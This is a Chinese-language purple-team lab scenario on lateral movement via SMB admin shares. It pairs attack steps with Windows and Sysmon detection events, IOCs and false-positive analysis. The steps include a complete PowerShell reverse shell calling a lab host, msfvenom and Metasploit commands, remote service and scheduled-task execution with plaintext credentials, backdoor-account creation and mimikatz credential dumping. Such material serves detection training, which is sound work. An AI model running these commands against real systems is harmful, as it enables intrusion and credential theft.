# 场景3：横向移动 (Lateral Movement)

## ATT&CK 映射

| 字段 | 值 |
|------|-----|
| 战术 | Lateral Movement (横向移动) |
| 技术 | T1021.002 - SMB/Windows Admin Shares (SMB/管理员共享) |
| 相关技术 | T1543.003 (Windows Service), T1059.003 (Windows Command Shell), T1021.006 (Windows Remote Management) |

## 场景描述

攻击者在 WIN10-01 上获得本地管理员权限后，通过 SMB 管理员共享（ADMIN$、C$）将恶意可执行文件上传到 WIN10-02，然后通过创建 Windows 服务或使用计划任务在远程主机上执行代码，实现横向移动。

## 攻击拓扑

```
WIN10-01 (192.168.56.30)          WIN10-02 (192.168.56.31)
    │                                    │
    │ 1. 上传 payload 到 \\WIN10-02\ADMIN$
    │ 2. sc.exe 创建远程服务
    │ 3. 启动服务执行 payload
    └───────────────────────────────────►│
                                         │ 4. payload 执行，建立 C2
                                         │ 5. 创建后门用户
```

## 检测要点

| 数据源 | Event ID | 检测逻辑 |
|--------|----------|----------|
| Windows 安全日志 | 4697 | 远程创建服务，服务路径指向可疑位置（ADMIN$\temp\） |
| Windows 安全日志 | 4688 | services.exe 派生可疑进程（非系统路径的 exe） |
| Windows 安全日志 | 5140 | 管理员共享（ADMIN$/C$）访问，来源非管理主机 |
| Sysmon | 11 | 可执行文件写入到 C:\Windows\ 或 C:\Windows\Temp\ |
| Sysmon | 3 | 来自 WIN10-01 的 445 端口连接 + 后续 135 端口（RPC） |
| Sysmon | 1 | sc.exe 命令行含 `\\\\WIN10-02 create` |
| Wazuh FIM | - | C:\Windows\ 目录下新增可执行文件 |

## 操作步骤

### 步骤1：准备恶意 Payload

在 Kali 上生成一个简单的反向 shell payload（实验室环境）：

```bash
# 使用 msfvenom 生成 Windows 反向 shell
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.56.100 LPORT=4444 \
    -f exe -o backdoor.exe

# 或者使用更简单的 PowerShell 反向 shell
cat > invoke-powershell-tcp.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('192.168.56.100',4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $x = ($error[0] | Out-String)
    $error.clear()
    $sendback2 = $sendback2 + $x
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
EOF
```

### 步骤2：在 Kali 上启动监听器

```bash
# 方法1：使用 netcat
nc -lvnp 4444

# 方法2：使用 Metasploit
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.56.100; set LPORT 4444; exploit"
```

### 步骤3：通过 SMB 上传 Payload 到目标

在 WIN10-01 上以管理员身份执行：

```powershell
# 建立到目标的 SMB 连接
net use \\WIN10-02\ADMIN$ /user:WIN10-02\Administrator P@ssw0rd!2024

# 上传 payload 到目标的 Windows 目录
copy backdoor.exe \\WIN10-02\ADMIN$\Temp\backdoor.exe

# 验证上传成功
dir \\WIN10-02\ADMIN$\Temp\backdoor.exe
```

### 步骤4：通过创建服务执行 Payload

```powershell
# 远程创建服务
sc.exe \\WIN10-02 create "UpdateService" binPath= "C:\Windows\Temp\backdoor.exe" start= auto

# 启动服务
sc.exe \\WIN10-02 start "UpdateService"

# 查看服务状态
sc.exe \\WIN10-02 query "UpdateService"
```

### 步骤5：通过计划任务执行（更隐蔽的替代方案）

```powershell
# 创建远程计划任务
schtasks /create /s WIN10-02 /u Administrator /p P@ssw0rd!2024 `
    /tn "SystemUpdate" /tr "C:\Windows\Temp\backdoor.exe" `
    /sc once /st 00:00 /f

# 立即运行任务
schtasks /run /s WIN10-02 /u Administrator /p P@ssw0rd!2024 /tn "SystemUpdate"
```

### 步骤6：通过 WMI 执行（无文件落地）

```powershell
# 使用 wmic 远程执行命令
wmic /node:WIN10-02 /user:Administrator /password:P@ssw0rd!2024 `
    process call create "cmd.exe /c whoami > C:\temp\result.txt"

# 使用 PowerShell WMI
Invoke-WmiMethod -Class Win32_Process -Name Create `
    -ArgumentList "cmd.exe /c net user backdoor P@ssw0rd! /add" `
    -ComputerName WIN10-02 -Credential (Get-Credential)
```

### 步骤7：在目标主机上执行后渗透操作

当反向 shell 连接回来后，在 WIN10-02 上执行：

```cmd
:: 查看系统信息
systeminfo
whoami /all

:: 创建持久化后门
net user backdoor P@ssw0rd! /add
net localgroup Administrators backdoor /add

:: 开启 RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

:: 抓取凭证（为下一轮横向移动做准备）
copy \\WIN10-01\C$\temp\mimikatz.exe C:\Windows\Temp\
C:\Windows\Temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

## 预期日志与告警

### Windows 安全日志（WIN10-02）

| Event ID | 说明 |
|----------|------|
| 5140 | 网络共享对象被访问（ADMIN$），来源 WIN10-01 |
| 5145 | 共享文件夹检查权限（写入 backdoor.exe） |
| 4697 | 服务创建（UpdateService），路径 C:\Windows\Temp\backdoor.exe |
| 4688 | services.exe 启动 backdoor.exe |
| 4672 | 管理员特权使用 |
| 4624 | 登录类型 3，来源 WIN10-01 |

### Sysmon 日志（WIN10-02）

| Event ID | 说明 |
|----------|------|
| 11 | backdoor.exe 写入到 C:\Windows\Temp\ |
| 1 | backdoor.exe 进程创建，父进程 services.exe |
| 3 | backdoor.exe 发起到 192.168.56.100:4444 的出站连接 |
| 13 | 服务注册表项创建（HKLM\SYSTEM\CurrentControlSet\Services\UpdateService） |

### Sysmon 日志（WIN10-01）

| Event ID | 说明 |
|----------|------|
| 1 | sc.exe 进程创建，命令行含 `\\\\WIN10-02 create` |
| 1 | net.exe 进程创建，命令行含 `use \\\\WIN10-02\ADMIN$` |
| 3 | 到 WIN10-02:445 和 135 的网络连接 |

## IOC（失陷指标）

| 类型 | 值 |
|------|-----|
| 服务名 | UpdateService, SystemUpdate |
| 服务路径 | C:\Windows\Temp\backdoor.exe |
| 文件路径 | C:\Windows\Temp\backdoor.exe |
| 计划任务名 | SystemUpdate |
| 网络连接 | 到 192.168.56.100:4444 的出站 TCP |
| 源 IP | 192.168.56.30 (WIN10-01) |
| 共享访问 | ADMIN$, C$ |
| 命令行 | `sc.exe \\\\WIN10-02 create`, `net use \\\\WIN10-02\ADMIN$` |

## 误报分析

- 合法软件远程安装：通常使用已知发布者签名的安装包，服务名有意义
- 组策略部署软件：通过 GPO 推送，有对应的 4688 事件和组策略日志
- 管理员远程维护：有变更工单，使用标准工具（psexec 等），时间在工作时段
